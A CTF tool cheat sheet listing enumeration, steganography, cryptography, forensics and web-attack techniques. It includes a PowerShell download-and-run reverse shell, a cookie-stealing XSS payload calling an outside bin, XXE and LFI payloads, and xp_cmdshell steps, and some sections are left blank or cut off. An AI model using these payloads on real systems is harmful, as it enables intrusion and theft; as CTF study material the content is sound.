CTF-Katana
===============

> John Hammond | February 1st, 2018

--------------------------


This repository, at the time of writing, will just host a listing of tools and commands that may help with CTF challenges. I hope to keep it as a "live document," and ideally it will not die out like the old "tools" page I had made ([https://github.com/USCGA/tools](https://github.com/USCGA/tools)).

Hopefully, at some point I will develop software that will run through a lot of the low-hanging fruit and simple command-line tools, generate a report and have all the output in one place.


---------------

Port Enumeration
====================


445 (smb/Samba)
-----------------------

* [`smbmap`](https://github.com/ShawnDEvans/smbmap)

	`smbmap` tells you permissions and access, which `smbclient` does _not_ do!
	
	To try and list shares as the anonymous user **DO THIS** (this doesn't always work for some weird reason)

```
smbmap -H 10.10.10.125 -u anonymous
```

Or you can attempt just:

```
smbmap -H 10.10.10.125
```

And you can specify a domain like so:

```
smbmap -H 10.10.10.125 -u anonymous -D HTB.LOCAL
```

Worth trying `localhost` as a domain, if that gets "NO_LOGON_SERVERS"

```
smbmap -H 10.10.10.125 -u anonymous -D localhost
```

* `enum4linux`


```
enum4linux 10.10.10.125
```

* `smbclient`

	**NOTE: DEPENDING ON THE VERSION OF SMBCLIENT YOU ARE USING, you may need to SPECIFY the use of S<B version 1 or SMB version 2. You can dp this with `-m SMB2`. Older versions of SMBclient (latest being 4.10 at the time of writing) use SMB1 _by default_.** 

	You can use `smbclient` to look through files shared with SMB. To _list_ available shares:

```	
smbclient -m SMB2 -N -L //10.10.10.125/
```

Once you find a share you want to/can access, you can connect to shares by using the name following the locator:

```
smbclient -m SMB2 -N //10.10.10.125/Reports
```

You will see a `smb: \>` prompt, and you can use `ls` and `get` to retrieve files or even `put` if you need to place files there.

1433 (Microsoft SQL Server)
------------------------------

* `impacket` -> `mssqlclient.py`
	
	You can connect to a Microsoft SQL Server with `myssqlclient.py` knowing a username and password like so:

```
mssqlclient.py username@10.10.10.125
```
	
It will prompt you for a password. **If your password fails, the server might be using "Windows authentication", which you can use with:**

```
mssqlclient.py username@10.10.10.125 -windows-auth
```

If you have access to a Micosoft SQL Server, you can try and `enable_xp_cmdshell` to run commands. With `mssqlclient.py` you can try:

```
SQL> enable_xp_cmdshell
``` 

though, you may not have permission. If that DOES succeed, you can now run commands like:

```
SQL> xp_cmdshell whoami
```

SNMP
----------------

* snmp-check

```
snmp-check 10.10.10.125
```


Microsoft Office Macros
---------------

* [`oletools`](https://github.com/decalage2/oletools) -> `olevba`

	`olevba` can look for Macros within office documents (which you should always check) with just supplying the filename:

```
olevba "Currency Volume Report.xlsm"
```

Retrieving Network Service Hashes
----------------------------------


* [`Responder.py`](https://github.com/SpiderLabs/Responder)


```
./Responder.py -I tun0
```


Windows Reverse Shells
---------------------------


* [Nishang][nishang]

	If you have access to PowerShell,  you can get a Reverse shell by using [nishang]'s `Invoke-PowerShellTcp.ps1` script inside of the `Shells` directory. Be sure to add the function call example to the bottom of your script, so all you need to to do to host it is (on your Attacker machine):

```
python -m SimpleHTTPServer
```

and then on the victim machine:

```
powershell IEX( New-Object Net.WebClient).DownloadString("http://10.10.14.6:8000/reverse.ps1") )
```

Also, if you want to have nice up and down arrow key usage within your Windows reverse shell, you can use the utility `rlwrap` before your netcat listener command.

```
rlwrap nc -lnvp 9001
```


Known Exploits
------------------

* Java RMI
	
	Metasploit module: `exploit/multi/misc/java_rmi_server`

	When testing this, responses are _known to come back with an error or exception_. Your code MAY VERY WELL still be executing. Try and run commands that include a callback. And _use Python_ to live off the land and try avoid special characters, like `|` pipes! [ysoserial](https://github.com/frohoff/ysoserial) is a good tool for deserializing Java code to take advantage of this vulnerability.
	
* Heartbleed

	Metasploit module: `auxiliary/scanner/ssl/openssl_heartbleed`

	Be sure to use `set VERBOSE true` to see the retrieved results. This can often contain a flag or some valuable information. 

* libssh - SSH

	`libssh0.8.1` (or others??) is vulnerable to an easy and immediate login. Metasploit module: `auxiliary/scanner/ssh/libssh_auth_bypass`. Be sure to `set spawn_pty true` to actually receive a shell! Then `sessions -i 1` to interact with the shell spawned (or whatever appropriate ID)

* Bruteforcing RDP

	Bruteforcing RDP with `hydra` or `ncrack` is __NOT ALWAYS ADVISABLE__ because of Cred-SSB. An option _might_ be to script xrdp to automate against a password or word list... __but THIS IS NOT TESTED__.

* Apache Tomcat

	If you can determine that you are working with an Apache Tomcat server (usually by visiting pages that do not exist and seeing a 404 error message), try to visit `/Manager`, which is usually accessible on Tomcat. Possible credentials could be `tomcat:tomcat`, `tomcat:s3cr3t`, `admin:s3cr3t`, `root:s3cr3t`, etc. etc.. Worthy of bruteforcing with `hydra`.

	If you see URLs are appended with a `.action` (not a `.do`), you may be working with Apache Struts. 

* Apache Struts

	To identify the Apache Struts version is running,

Excess
--------

* [wifite2](https://github.com/derv82/wifite2)

	Brute-force a Wi-Fi access point.

* [impacket](https://github.com/SecureAuthCorp/impacket)

	Tool to quickly spin up a Samba share.

* [enum4linux](https://github.com/portcullislabs/enum4linux)

	Script to scan Windows Samba shares. VERY GOOD TO RUN FOR WINDOWS ENUMERATION.

* Drupal [drupalgeddon](https://github.com/dreadlocked/Drupalgeddon2)

	Attack script for old or outdated Drupal servers. Usually very effective.

Esoteric Languages
-----------------------


* [https://tio.run/](https://tio.run/)

	An online tool that has a ton of Esoteric language interpreters. 

* Brainfuck

	This language is easily detectable by its huge use of plus signs, braces, and arrows. 	There are plenty of online interpreters, like this one: [https://copy.sh/brainfuck/](https://copy.sh/brainfuck/) Some example code:

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++++++++++++++.--.--------------.+++++++++++++.----.-----------
--.++++++++++++.--------.<------------.<++.>>----.+.<+++++++++++.+++++++++++++.>+++++++++++++++++.-------------
--.++++.+++++++++++++++.<<.>>-------.<+++++++++++++++.>+++..++++.--------.+++.<+++.<++++++++++++++++++++++++++
.<++++++++++++++++++++++.>++++++++++++++..>+.----.>------.+++++++.--------.<+++.>++++++++++++..-------.++.
```

* COW

	This language is easily identified by numerous "MOO" statements and random capitalization. It has an option on [https://tio.run/](https://tio.run/).

* [Malboge]

	An esoteric language that looks a lot like Base85... but isn't. Often has references to "Inferno" or "Hell" or "Dante." Online interpreters like so: [http://www.malbolge.doleczek.pl/](http://www.malbolge.doleczek.pl/) Example code:

```
(=<`#9]~6ZY32Vx/4Rs+0No-&Jk)"Fh}|Bcy?`=*z]Kw%oG4UUS0/@-ejc(:'8dc
```

* [Piet]

	A graphical programming language... looks like large 8-bit pixels in a variety of colors. Can be interpreted with the tool [`npiet`][npiet]

![https://www.bertnase.de/npiet/hi.png](https://www.bertnase.de/npiet/hi.png)

* [Ook!](http://esolangs.org/wiki/ook!)

	A joke language. Recognizable by `.` and `?`, and `!`.

```
Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.

Steganography
---------------------

* [StegCracker][StegCracker]

	Don't ever forget about [`steghide`][steghide]! This tool can use a password list like `rockyou.txt` with steghide. SOME IMAGES CAN HAVE MULTIPLE FILED ENCODED WITH MULTIPLE PASSWORDS.

* [Steganography Online](http://stylesuxx.github.io/steganography/)

	A tool often used in CTFs for encoding messages into images.

* [`steg_brute.py`](https://github.com/Va5c0/Steghide-Brute-Force-Tool)

	This is similar to `stegcracker` above.

* [`openstego`][OpenStego]

	A [Java][Java] [`.JAR`][JAR] tool, that can extract data from an image. A good tool to use on guessing challenges, when you don't have any other leads. We found this tool after the [Misc50](http://0xahmed.ninja/nullcon-hackim18-ctf-writeups/) challenge from [HackIM 2018](https://ctftime.org/event/566)

* [`Stegsolve.jar`][Stegsolve.jar]

	A [Java][Java] [`.JAR`][JAR] tool, that will open an image and let you as the user arrow through different renditions of the image (viewing color channels, inverted colors, and more). The tool is surprisingly useful.

* [`steghide`][steghide]

	A command-line tool typically used alongside a password or key, that could be uncovered some other way when solving a challenge. 

* [`stepic`](http://domnit.org/stepic/doc/)

	Python image steganography. Stepic hides arbitrary data inside PIL images. Download it here: http://domnit.org/stepic/doc/

* [Digital Invisible Ink Stego Tool](http://diit.sourceforge.net/)

	A Java steganography tool that can hide any sort of file inside a digital image (regarding that the message will fit, and the image is 24 bit colour)

# WHEN GIVEN A FILE TO WORK WITH, DO NOT FORGET TO RUN THIS STEGHIDE WITH AN EMPTY PASSWORD!

* [ImageHide](https://www.softpedia.com/get/Security/Encrypting/ImageHide.shtml)

	For PNG images (or BMP) images, there exists a Windows utility that can hide "ENCRYPTED" text within the LSB. If you also happen to have passwords, you can decrypt this and potentially find a flag. [https://www.softpedia.com/get/Security/Encrypting/ImageHide.shtml](https://www.softpedia.com/get/Security/Encrypting/ImageHide.shtml)

* [stegoVeritas](https://github.com/bannsec/stegoVeritas/)

	Another steganography tool. A simple command-line tool and super easy to use -- definitely one to at least try.

* Unicode Steganography / Zero-Width Space Characters

	Some text that may be trying to hide something, in a seemingly innocent way, like "Hmm, there may be something hiding here..." may include zero-width characters. This is a utility that might help: [https://330k.github.io/misc_tools/unicode_steganography.html](https://330k.github.io/misc_tools/unicode_steganography.html) ... Other options are just gross find and replace operations in Python IDLE.

* Online LSB Tools

	There are many online LSB tools that work in different ways. If you are given a file that you know is part of a Least Significant Bit challenge, try these tools:

	[https://manytools.org/hacker-tools/steganography-encode-text-into-image/](https://manytools.org/hacker-tools/steganography-encode-text-into-image/) Only supports PNG
	[https://stylesuxx.github.io/steganography/](https://stylesuxx.github.io/steganography/)

* Other stego tools:

	[https://github.com/DominicBreuker/stego-toolkit](https://github.com/DominicBreuker/stego-toolkit)
	
* [`zsteg`][zsteg]

	Command-line tool for use against Least Significant Bit steganography... unfortunately only works against PNG and BMP images.

* [`jsteg`][jsteg]

    Another command-line tool to use against JPEG images. [https://github.com/lukechampine/jsteg](https://github.com/lukechampine/jsteg) Handy for Hackerrank Codefest CTF 2018.

* [Jstego][Jstego]

    A GUI tool for JPG steganography. [https://sourceforge.net/projects/jstego/](https://sourceforge.net/projects/jstego/) It is a [Java][Java] [JAR] file similar to stegsolve.jar

* Morse Code

	Always test for this if you are seeing two distinct values... _it may not always be binary!_ Online decoders like so: [https://morsecode.scphillips.com/translator.html](https://morsecode.scphillips.com/translator.html). If you need to be case-sensistive or include a bit more stuff like numbers and punctuation, use this code: [https://gist.github.com/JohnHammond/961acabfd85a8715220fa79492b25368](https://gist.github.com/JohnHammond/961acabfd85a8715220fa79492b25368)

	If you find Morsecode in the "international written form", like "dah-dit-dit-dah" etcetera, you can use this code: [https://gist.github.com/JohnHammond/7d3ddb167fa56f139dc4419091237b51](https://gist.github.com/JohnHammond/7d3ddb167fa56f139dc4419091237b51) ... which was carved out of this resource: [https://morsecode.scphillips.com/morse.html](https://morsecode.scphillips.com/morse.html)

* Whitespace

	Tabs and spaces could be representing 1's and 0's and treating them as a binary message... or, they could be whitespace done with [`snow`][snow] or an esoteric programming language interpreter: [https://tio.run/#whitespace](https://tio.run/#whitespace)

* Audio Speed Change (also change pitch)

```
mplayer -af scaletempo -speed 64 flag.mp3
``` 

* DNA Codes

    When given a sequence with only A, C, G, T , there is an online mapping for these. Try this:

    ![img/dna_codes.png](img/dna_codes.png)
    ![img/genome_coding.jpg](img/genome-coding.jpg)

* Extract Thumbnail (data is covered in original image)

	If you have an image where the data you need is covered, try viewing the thumbnail:

```
exiftool -b -ThumbnailImage my_image.jpg > my_thumbnail.jpg
```

* [`snow`][snow]

	A command-line tool for whitespace steganography (see above).

* SONIC Visualizer (audio spectrum)

	Some classic challenges use an audio file to hide a flag or other sensitive stuff. SONIC visualizer easily shows you [spectrogram](https://en.wikipedia.org/wiki/Spectrogram). __If it sounds like there is random bleeps and bloops in the sound, try this tactic!__

* [Detect DTMF Tones]

	Audio frequencies common to a phone button, DTMF: [https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling](https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling).

* Phone-Keypad

	Some messages may be hidden with a string of numbers, but really be encoded with old cell-phone keypads, like text messaging with numbers repeated:

![https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSySxHjMFv80XWp74LZpfrnAro6a1MLqeF1F3zpguA5PGSW9ov](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSySxHjMFv80XWp74LZpfrnAro6a1MLqeF1F3zpguA5PGSW9ov)

* [`hipshot`][hipshot]

	A [Python] module to compress a video into a single standalone image, simulating a long-exposure photograph. Was used to steal a [QR code] visible in a video, displayed through "Star Wars" style text motion.	

* [QR code]

	A small square "barcode" image that holds data.

* [`zbarimg`][zbarimg]

	A command-line tool to quickly scan multiple forms of barcodes, [QR codes] included. Installed like so on a typical [Ubuntu] image: 

```
sudo apt install zbar-tools
```
	
* Punctuation marks `!`, `.` and `?`

	I have seen some challenges use just the end of `.` or `?` or `!` to represent the [Ook](http://esolangs.org/wiki/ook!) esoteric programming language. Don't forget that is a thing!

Cryptography
-----------------

* Cryptii
	
	[https://cryptii.com](https://cryptii.com) has multiple decoding tools like base64, Ceaser Cipher, ROT13, Vigenère Cipher and more.
* Keyboard Shift
	
	[https://www.dcode.fr/keyboard-shift-cipher](https://www.dcode.fr/keyboard-shift-cipher) If you see any thing that has the shape of a sentence but it looks like nonsense letters, and notes some shift left or right, it may be a keyboard shift...

* Bit Shift

	Sometimes the letters may be shifted by a stated hint, like a binary bit shift ( x >> 1 ) or ( x << 1 ).

* Reversed Text

	Sometimes a "ciphertext" is just as easy as reversed text. Don't forgot to check under this rock! You can reverse a string in [Python] like so:

```
"UOYMORFEDIHOTGNIYRTEBTHGIMFTCA.TAHTTERCESASISIHT"[::-1]
```

* XOR

	ANY text could be XOR'd. Techniques for this are Trey's code, and XORing the data against the known flag format. Typically it is given in just hex, but once it is decoded into raw binary data, it gives it keeps it's hex form (as in `\xde\xad\xbe\xef` etc..) Note that you can do easy XOR locally with Python like so (you need `pwntools` installed):

	``` python
	python >>> import pwn; pwn.xor("KEY", "RAW_BINARY_CIPHER")
	```

# IF YOU KNOW A DECENT CRIB (PLAINTEXT), USE CYBERCHEF TO HELP DETERMINE THE KEY

# DO NOT FORGET TO JUST BRUTEFORCE JUST THE FIRST BYTE, OR TWO BYTES OR THREE BYTES.


* Caesar Cipher

	The most classic shift cipher. Tons of online tools like this: [https://www.dcode.fr/caesar-cipher](https://www.dcode.fr/caesar-cipher) or use `caesar` as a command-line tool (`sudo apt install bsdgames`) and you can supply a key for it. Here's a one liner to try all letter positions:

	```
	cipher='jeoi{geiwev_gmtliv_ws_svmkmrep}' ; for i in {0..25}; do echo $cipher | caesar $i; done
	```

	__Be aware!__ Some challenges include punctuation in their shift! If this is the case, try to a shift within all 255 ASCII characters, not just 26 alphabetical letters!

* `caesar`

	A command-line caesar cipher tool (noted above) found in the `bsdgames` package.

* [Atbash Cipher]

	If you have some text that you have no idea what it is, try the [Atbash cipher]! It's a letter mapping, but the alphabet is reversed: like `A` maps to `Z`, `B` maps to `Y` and so on. There are tons of online tools to do this ([http://rumkin.com/tools/cipher/atbash.php](http://rumkin.com/tools/cipher/atbash.php)), and you can build it with [Python].

* [Vigenere Cipher]

	[http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx](http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx), [https://www.guballa.de/vigenere-solver](https://www.guballa.de/vigenere-solver) and personal Python code here: [https://pastebin.com/2Vr29g6J](https://pastebin.com/2Vr29g6J)


* Gronsfeld Cipher

	A variant of the Vignere cipher that uses numbers insteads of letters. [http://rumkin.com/tools/cipher/gronsfeld.php](http://rumkin.com/tools/cipher/gronsfeld.php)

* Beaufourt Cipher

	[https://www.dcode.fr/beaufort-cipher](https://www.dcode.fr/beaufort-cipher)


* Python random module cracker/predictor

	[https://github.com/tna0y/Python-random-module-cracker](https://github.com/tna0y/Python-random-module-cracker)... helps attack the Mersenne Twister used in Python's random module. 

* Transposition Cipher

* RSA: Classic RSA

	Variables typically given: `n`, `c`, `e`. _ALWAYS_ try and give to [http://factordb.com](http://factordb.com). If `p` and `q` are able to be determined, use some RSA decryptor; handmade code available here: [https://pastebin.com/ERAMhJ1v](https://pastebin.com/ERAMhJ1v)

* RSA: Multi-prime RSA

	When you see multi-prime RSA, you can use calculate `phi` by still using all the factors.

```
phi = (a - 1) * (b - 1) * (c - 1)    # ... etcetera
```

__If FactorDB cannot find factors, try alpertron: [https://www.alpertron.com.ar/ECM.HTM](https://www.alpertron.com.ar/ECM.HTM)__


* RSA: `e` is 3 (or small)

	If `e` is 3, you can try the cubed-root attack. If you the cubed root of `c`, and if that is smaller than the cubed root of `n`, then your plaintext message `m` is just the cubed root of `c`! Here is [Python] code to take the cubed root:

```
def root3rd(x):
    y, y1 = None, 2
    while y!=y1:
        y = y1
        y3 = y**3
        d = (2*y3+x)
        y1 = (y*(y3+2*x)+d//2)//d
    return y 
``` 

* RSA: Weiner's Little D Attack

	The telltale sign for this kind of challenge is an enormously large `e` value. Typically `e` is either 65537 (0x10001) or `3` (like for a Chinese Remainder Theorem challenge). Some stolen code available here: [https://pastebin.com/VKjYsDqD](https://pastebin.com/VKjYsDqD)

* RSA:  Boneh-Durfee Attack
	The tellgate sign for this kind of challenge is also an enormously large `e` value (`e` and `n` have similar size).
Some code for this attack can be found [here](https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage) 

* RSA: Chinese Remainder Attack

	These challenges can be spotted when given  mutiple `c` cipher texts and multiple `n` moduli. `e` must be the same number of given `c` and `n` pairs. Some handmade code here: [https://pastebin.com/qypwc6wH](https://pastebin.com/qypwc6wH)

* [LC4]

	This is an adaptation of RC4... just not. There is an implementation available in Python.
	[https://github.com/dstein64/LC4/blob/master/documentation.md](https://github.com/dstein64/LC4/blob/master/documentation.md)

* Elgamal

* Affine Cipher

* Substitution Cipher (use quip quip!)

	[https://quipqiup.com/](https://quipqiup.com/)

* Railfence Cipher

	[http://rumkin.com/tools/cipher/railfence.php](http://rumkin.com/tools/cipher/railfence.php)


* [Playfair Cipher]

	racker: [http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html](http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html)

* Polybius Square

	[https://www.braingle.com/brainteasers/codes/polybius.php](https://www.braingle.com/brainteasers/codes/polybius.php)

* The Engima

	[http://enigma.louisedade.co.uk/enigma.html](http://enigma.louisedade.co.uk/enigma.html),
	[https://www.dcode.fr/enigma-machine-cipher](https://www.dcode.fr/enigma-machine-cipher)

* AES ECB

	The "blind SQL" of cryptography... leak the flag out by testing for characters just one byte away from the block length.


* Two-Time Pad

* [`International Code of Signals maritime `][intmaritimeflags]

	First drafted by the British Board of Trade in 1855 and adopted as a world-wide standard on 1 January 1901. It is used for communications with ships, but also occasionally used by geocaching mystery caches (puzzle caches), CTFs and various logic puzzles. You may want to give a look a the tool [`maritime flags translator`][maritime flags translator]

![https://www.marvindisplay.com/images/SignalFlags.gif](https://www.marvindisplay.com/images/SignalFlags.gif)


Networking
---------------

* [Wireshark]

	The go-to tool for examining [`.pcap`][PCAP] files. 

* [Network Miner]

	Seriously cool tool that will try and scrape out images, files, credentials and other goods from [PCAP] and [PCAPNG] files.

* [PCAPNG]

	Not all tools like the [PCAPNG] file format... so you can convert them with an online tool [http://pcapng.com/](http://pcapng.com/) or from the command-line with the `editcap` command that comes with installing [Wireshark]:

```
editcap old_file.pcapng new_file.pcap
```

* [`tcpflow`][tcpflow]

	A command-line tool for reorganizing packets in a PCAP file and getting files out of them. __Typically it gives no output, but it creates the files in your current directory!__ 

```
tcpflow -r my_file.pcap
ls -1t | head -5 # see the last 5 recently modified files
```



* [PcapXray]

	A GUI tool to visualize network traffic.

PHP
------------

* Magic Hashes

	A common vulnerability in [PHP] that fakes hash "collisions..." where the `==` operator falls short in [PHP] type comparison, thinking everything that follows `0e` is considered scientific notation (and therefore 0). More valuable info can be found here: [https://github.com/spaze/hashes](https://github.com/spaze/hashes), but below are the most common breaks.

* `preg_replace`

	A bug in older versions of [PHP] where the user could get remote code execution
	
	[http://php.net/manual/en/function.preg-replace.php](http://php.net/manual/en/function.preg-replace.php)


* [`phpdc.phpr`][phpdc.phpr]

	A command-line tool to decode [`bcompiler`][bcompiler] compiled [PHP] code.


* [`php://filter` for Local File Inclusion](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/)

	A bug in [PHP] where if GET HTTP variables in the URL are controlling the navigation of the web page, perhaps the source code is `include`-ing other files to be served to the user. This can be manipulated by using [PHP filters](http://php.net/manual/en/filters.php) to potentially retrieve source code. Example like so:

```
http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
```


* `data://text/plain;base64`

	A [PHP] stream that can be taken advantage of if used and evaluated as an `include` resource or evaluated. Can be used for RCE: check out this writeup: [https://ctftime.org/writeup/8868](https://ctftime.org/writeup/8868) ... TL;DR:

```

``` 


PDF Files
-------------

* `pdfinfo`	
	
	A command-line tool to get a basic synopsis of what the [PDF] file is.

* `pdfcrack`

	A comand-line tool to __recover a password from a PDF file.__ Supports dictionary wordlists and bruteforce.

* `pdfimages`

	A command-line tool, the first thing to reach for when given a PDF file. It extracts the images stored in a PDF file, but it needs the name of an output directory (that it will create for) to place the found images.

* [`pdfdetach`][pdfdetach]

	A command-line tool to extract files out of a [PDF].

Forensics
-----------

* Python bytecode `uncompyle6`

	To decompile bytecode, use `uncompyle6`. There is one special argument (I think `-d` or something???) that can have success if the default operation does not work. Do not give up hope when working with obvious Python bytecode. EasyPythonDecompiler might work, or perhaps testing with `uncompyle`

* Keepass 

	`keepassx` can be installed on Ubuntu to open and explore Keepass databases. Keepass databases master passwords can be cracked with `keepass2john`. 

* [Magic Numbers]

	The starting values that identify a file format. These are often crucial for programs to properly read a certain file type, so they must be correct. If some files are acting strangely, try verifying their [magic number] with a [trusted list of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures).

* [`hexed.it`][hexed.it]

	An online tool that allows you to modify the hexadecimal and binary values of an uploaded file. This is a good tool for correcting files with a corrupt [magic number]

* [`dumpzilla`][dumpzilla]

	A [Python] script to examine a `.mozilla` configuration file, to examine downloads, bookmarks, history or bookmarks and registered passwords. Usage may be as such:

```
python dumpzilla.py .mozilla/firefox/c3a958fk.default/ --Downloads --History --Bookmarks --Passwords
```


* Repair image online tool

    Good low-hanging fruit to throw any image at: [https://online.officerecovery.com/pixrecovery/](https://online.officerecovery.com/pixrecovery/)


* `foremost`

	A command-line tool to carve files out of another file. Usage is `foremost [filename]` and it will create an `output` directory.

```
sudo apt install foremost
```

* `binwalk`

	A command-line tool to carve files out of another file. Usage to extract is `binwalk -e [filename]` and it will create a `_[filename]_extracted` directory.

```
	sudo apt install binwalk
```


* [`hachoir-subfile`][hachoir-subfile]

	A command-line tool to carve out files of another file. Very similar to the other tools like `binwalk` and `foremost`, but always try everything!


* [TestDisk]

	A command-line tool, used to recover deleted files from a file system image. Handy to use if given a `.dd` and `.img` file etc.

* [photorec]

	Another command-line utility that comes with `testdisk`. It is file data recovery software designed to recover lost files including video, documents and archives from hard disks, CD-ROMs, and lost pictures (thus the Photo Recovery name) from digital camera memory. PhotoRec ignores the file system and goes after the underlying data, so it will still work even if your media's file system has been severely damaged or reformatted. 


PNG File Forensics
--------------------


* `pngcheck`

	A command-line tool for "checking" a [PNG] image file. Especially good for verifying checksums.


* [`pngcsum`](http://www.schaik.com/png/pngcsum/pngcsum-v01.tar.gz)

	Correct the CRC on all of the parts of a [PNG] image file.


* [https://github.com/sherlly/PCRT](https://github.com/sherlly/PCRT)

	Utility to try and correct a [PNG] file. **NOTE... this will NOT SAVE your file as new one. YOU HAVE TO SHOW the file (enter y when using the script]) to actually view the new image.**


APK Forensics
---------------

* [`apktool`][apktool]

	A command-line tool to extract all the resources from an APK file. Usage:

```
apktool d <file.apk>
```


* [`dex2jar`][dex2jar]

	A command-line tool to convert a J.dex file to .class file and zip them as JAR files.


* [`jd-gui`][jd-gui]

	A GUI tool to decompile Java code, and JAR files.
	

Web
----------------

* `robots.txt`

	This file tries to hide webpages from web crawlers, like Google or Bing or Yahoo. A lot of sites try and use this mask sensitive files or folders, so it should always be some where you check during a CTF. [http://www.robotstxt.org/](http://www.robotstxt.org/)

* [Edit This Cookie]

	A web browser plug-in that offers an easy interface to modifying [cookies]. ___THIS IS OFTEN OVERLOOKED, WITHOUT CHANGING THE VALUE OF THE COOKIES... BE SURE TO FUZZ EVERYTHING, INCLUDING COOKIE VALUES!___

* Backup pages ( `~` and `.bak` and `.swp` )

	Some times you may be able to dig up an old version of a webpage (or some PHP source code!) by adding the usual backup suffixes. A good thing to check!

* `/admin/`

	This directory is often found by directory scanning bruteforce tools, so I recommend just checking the directory on your own, as part of your own "low-hanging fruits" check.

* `/.git/`
	
	A classic CTF challenge is to leave a `git` repository live and available on a website. You can see this with `nmap -A` (or whatever specific script catches it) and just by trying to view that specific folder, `/.git/`. A good command-line tool for this is [`GitDumper.sh`](https://github.com/internetwache/GitTools), or just simply using [`wget`][wget].

	**Sometimes you might Bazaar or Mercurial or other distributed version control systems. You can use [https://github.com/kost/dvcs-ripper](https://github.com/kost/dvcs-ripper) for those!!**

* [`GitDumper.sh`][GitDumper.sh]
	
	A command-line tool that will automatically scrape and download a [git] repository hosted online with a given URL.

* Bazaar `.bzr`

	If you see a publically accessible `.bzr` directory, you can use `bzr branch http://site output-directory` to download it. Or, use this utility: [https://github.com/kost/dvcs-ripper](https://github.com/kost/dvcs-ripper)

* [XSS]/[Cross-site scripting]

	[XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet). [Cross-site scripting], vulnerability where the user can control rendered [HTML] and ideally inject [JavaScript] code that could drive a browser to any other website or make any malicious network calls. Example test payload is as follows:


```
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```

	Typically you use this to steal cookies or other information, and you can do this with an online requestbin.

```
<img src="#" onerror="document.location='http://requestbin.fullcontact.com/168r30u1?c' + document.cookie">
```
* new usefull XSS cheat sheet : 'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet'
* [CloudFlare Bypass](https://github.com/Anorov/cloudflare-scrape)

	If you need to script or automate against a page that uses the I'm Under Attack Mode from CloudFlare, or DDOS protection, you can do it like this with linked Python module.
	
``` python
#!/usr/bin/env python

import cfscrape

url = 'http://yashit.tech/tryharder/'

scraper = cfscrape.create_scraper() 
print scraper.get(url).content 
```

* [XSStrike]

	A command-line tool for automated [XSS] attacks. Seems to function like how [sqlmap] does.

* [`wpscan`][wpscan]

	* A Ruby script to scan and do reconnaissance on a [Wordpress] application. 

* Mac AutoLogin Password Cracking

Sometimes, given an Mac autologin password file `/etc/kcpassword`, you can crack it with this code:

```
def kcpasswd(ciphertext):
    key = '7d895223d2bcddeaa3b91f'
    while len(key) < (len(ciphertext)*2):
        key = key + key
    key = binasciiunhexlify(key)
    result = ''
    for i in range(len(ciphertext)):
        result += chr(ord(ciphertext[i]) ^ (key[i]))
    return result
```
* XXE : XML External Entity

An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.
We try to display the content of the file /flag :

```
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///flag">
]>
<data>&file;</data>

<?xml version="1.0" encoding="UTF-16"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///flag" >]><foo>&xxe;</foo>
  
  ```
* Wordpress Password Hash Generator

	If you make it into a Wordpress database and can change passwords, reset the admin password to a new hash: [http://www.passwordtool.hu/wordpress-password-hash-generator-v3-v4](http://www.passwordtool.hu/wordpress-password-hash-generator-v3-v4). This will let you login to /wp-admin/ on the site.

Hand-made code to exploit and overwrite functions: [https://pastebin.com/0r4WGn3D](https://pastebin.com/0r4WGn3D) and a video walkthrough explaining: [https://www.youtube.com/watch?v=t1LH9D5cuK4](https://www.youtube.com/watch?v=t1LH9D5cuK4)

* [`formatStringExploiter`][formatStringExploiter]

	A good [Python] module to streamline exploiting a [format string vulnerability]. THIS IS NOT ALWAYS A GOOD TACTIC...

* 64-bit Buffer Overflow

But, check if whether or not the function address you need starts with the same hex values already on the stack (in `rsp`). Maybe you only have to write two or three bytes after the overflow, rather than the whole function address.

* 15 Puzzle
	
	A sliding puzzle that consists of a 4x4 grid with numbered square tiles, with one missing, set in a random order. It was involved in SharifCTF to determine if a group of these puzzles was solvable: [https://theromanxpl0it.github.io/ctf_sharifctf18/fifteenpuzzle/](https://theromanxpl0it.github.io/ctf_sharifctf18/fifteenpuzzle/)


* SETUID Binary Methodology

	Don't forget to check "simple" things --- it doesn't need to be a pwn or binary exploitation challenge, keep in mind IT DOES NOT use a secure PATH like `sudo`.

* Chrome Password Dump

	A [Windows] command-line tool to dump passwords saved with Google Chrome.
	[http://securityxploded.com/chrome-password-dump.php](http://securityxploded.com/chrome-password-dump.php)

* `img2txt`

	A command-line tool to convert an image into ASCII for the terminal. Can be installed like so:

```
sudo apt install -y caca-utils
```


* Strange Symbols/Characters

	Some CTFs will try and hide a message on a picture with strange symbols. Try and Google Reverse Image searcht these. They may be Egyptian Characters:

* Bitcoin

	You might see a private Bitcoin key as a base64 encoded SHA256 hash, like this:

```
NWEyYTk5ZDNiYWEwN2JmYmQwOGI5NjEyMDVkY2FlODg3ZmIwYWNmOWYyNzI5MjliYWE3OTExZmFhNGFlNzc1MQ==
```

	Decoded, it is a hash: `5a2a99d3baa07bfbd08b961205dcae887fb0acf9f272929baa7911faa4ae7751`.

	If you can find an AES ECB key along with (usually represented in hex or another encoding), you can decipher like so:

```
